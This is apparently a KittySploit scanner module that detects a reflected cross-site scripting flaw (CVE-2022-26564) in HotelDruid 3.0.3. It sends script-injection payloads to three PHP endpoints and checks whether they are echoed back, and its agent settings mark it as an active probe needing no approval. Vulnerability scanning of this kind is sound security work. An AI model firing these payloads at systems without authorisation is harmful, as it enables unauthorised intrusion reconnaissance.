#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HotelDruid Hotel Management Software 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HotelDruid Hotel Management Software 3.0.3 - Cross-Site Scripting Detection',
        'description': 'HotelDruid Hotel Management Software 3.0.3 contains a cross-site scripting vulnerability via the prezzoperiodo4 parameter in creaprezzi.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'hoteldruid', 'xss', 'digitaldruid', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://rydzak.me/2022/04/cve-2022-26564/',
            'https://www.hoteldruid.com',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-26564',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-26564',
    }

    def run(self):
        for path in ('/creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27XSS%27)</script>', '/modifica_cliente.php?tipo_tabella=%22><script>javascript:alert(%27XSS%27)</script>&idclienti=1', '/dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27XSS%27)</script>'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ("<script>javascript:alert('XSS')</script>", 'HotelDruid',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="HotelDruid Hotel Management Software 3.0.3 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

